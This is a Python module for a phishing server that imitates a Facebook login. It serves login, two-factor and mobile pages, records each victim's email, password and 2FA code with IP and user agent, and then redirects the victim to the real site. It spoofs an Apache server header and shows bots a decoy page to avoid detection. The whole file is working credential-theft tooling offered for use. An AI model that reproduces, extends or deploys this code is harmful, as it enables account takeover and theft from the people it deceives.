"""
HTTP/HTTPS Phishing Server Module
Author : Jitu Jak
"""

import os
import sys
import ssl
import json
import datetime
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from modules.templates import TemplateManager
from modules.utils import get_client_ip, get_user_agent

class PhishingHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/' or path == '/login' or path == '/index.html':
            self.serve_login_page()
        elif path == '/2fa':
            self.serve_2fa_page()
        elif path == '/mobile':
            self.serve_mobile_page()
        elif path == '/favicon.ico':
            self.serve_favicon()
        else:
            # Catch-all: redirect to Facebook
            self.send_response(302)
            self.send_header('Location', self.server.config['redirect']['after_login'])
            self.end_headers()
    
    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)
        
        ip = get_client_ip(self)
        ua = get_user_agent(self)
        
        # Check honeypot field
        if 'website' in params and params['website'][0]:
            # Bot detected, send fake data
            self.send_fake_response()
            return
        
        if path == '/login':
            self.handle_login(params, ip, ua)
        elif path == '/2fa':
            self.handle_2fa(params, ip, ua)
        else:
            self.send_response(404)
            self.end_headers()
    
    def serve_login_page(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Server', 'Apache/2.4.41 (Ubuntu)')
        self.send_header('X-Content-Type-Options', 'nosniff')
        self.send_header('X-Frame-Options', 'DENY')
        self.end_headers()
        
        page = self.server.templates.get_login_template()
        self.wfile.write(page.encode('utf-8'))
        
        # Log access
        self.server.access_log(f"GET / from {self.client_address[0]}")
    
    def serve_2fa_page(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Server', 'Apache/2.4.41 (Ubuntu)')
        self.end_headers()
        
        page = self.server.templates.get_2fa_template()
        self.wfile.write(page.encode('utf-8'))
    
    def serve_mobile_page(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        
        page = self.server.templates.get_mobile_template()
        self.wfile.write(page.encode('utf-8'))
    
    def serve_favicon(self):
        self.send_response(200)
        self.send_header('Content-Type', 'image/x-icon')
        self.end_headers()
        # Serve a transparent 1x1 icon
        self.wfile.write(b'\x00\x00\x01\x00\x01\x00\x10\x10\x00\x00\x01\x00\x20\x00\x68\x04\x00\x00\x16\x00\x00\x00')
    
    def handle_login(self, params, ip, ua):
        email = params.get('email', [''])[0]
        password = params.get('pass', [''])[0]
        
        if email and password:
            data = {
                'email': email,
                'password': password,
                'timestamp': datetime.datetime.now().isoformat(),
                'ip': ip,
                'user_agent': ua,
                'type': 'credentials'
            }
            
            # Log credentials
            self.server.logger.log_credentials(data)
            
            # Check if 2FA capture is enabled
            if self.server.config['capture']['two_factor']:
                # Store email temporarily for 2FA session
                self.server.temp_data[ip] = {'email': email}
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.end_headers()
                page = self.server.templates.get_2fa_template()
                self.wfile.write(page.encode('utf-8'))
            else:
                # Redirect to real Facebook
                delay = self.server.config['redirect'].get('delay_seconds', 0)
                if delay > 0:
                    import time
                    time.sleep(delay)
                
                self.send_response(302)
                self.send_header('Location', self.server.config['redirect']['after_login'])
                self.end_headers()
        else:
            # Show error on login page
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            page = self.server.templates.get_login_template(error=True)
            self.wfile.write(page.encode('utf-8'))
    
    def handle_2fa(self, params, ip, ua):
        code = params.get('2fa_code', [''])[0]
        
        if code:
            data = {
                'code': code,
                'email': self.server.temp_data.get(ip, {}).get('email', 'Unknown'),
                'timestamp': datetime.datetime.now().isoformat(),
                'ip': ip,
                'user_agent': ua,
                'type': '2fa_code'
            }
            
            self.server.logger.log_2fa(data)
            
            # Clean up temp data
            if ip in self.server.temp_data:
                del self.server.temp_data[ip]
        
        # Redirect to real Facebook
        self.send_response(302)
        self.send_header('Location', self.server.config['redirect']['after_2fa'])
        self.end_headers()
    
    def send_fake_response(self):
        """Send fake data to bots"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h1>Welcome</h1></body></html>')
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass


class PhishingServer:
    def __init__(self, config, logger, template_type="desktop"):
        self.config = config
        self.logger = logger
        self.temp_data = {}
        self.httpd = None
        self.templates = TemplateManager(template_type)
        self.access_log_file = os.path.join(
            config['logging']['log_directory'], 'access.log'
        )
    
    def start(self):
        host = self.config['server']['host']
        port = self.config['server']['port']
        
        server_address = (host, port)
        self.httpd = HTTPServer(server_address, PhishingHandler)
        self.httpd.config = self.config
        self.httpd.logger = self.logger
        self.httpd.templates = self.templates
        self.httpd.temp_data = self.temp_data
        self.httpd.access_log = self._log_access
        
        protocol = "HTTP"
        if self.config['server']['use_https']:
            cert_file = self.config['server']['ssl_cert']
            key_file = self.config['server']['ssl_key']
            
            if not os.path.exists(cert_file) or not os.path.exists(key_file):
                print("[!] SSL certificates not found. Run setup.sh first.")
                sys.exit(1)
            
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(cert_file, key_file)
            self.httpd.socket = context.wrap_socket(self.httpd.socket, server_side=True)
            protocol = "HTTPS"
        
        print(f"\n{'='*60}")
        print(f"  [*] Server running on {protocol}://{host}:{port}/")
        print(f"  [*] Phishing page: {protocol}://{host}:{port}/")
        print(f"  [*] Log directory: {self.config['logging']['log_directory']}/")
        print(f"  [*] Redirect target: {self.config['redirect']['after_login']}")
        print(f"{'='*60}\n")
        
        self.httpd.serve_forever()
    
    def stop(self):
        if self.httpd:
            self.httpd.server_close()
    
    def _log_access(self, message):
        with open(self.access_log_file, 'a') as f:
            f.write(f"[{datetime.datetime.now().isoformat()}] {message}\n")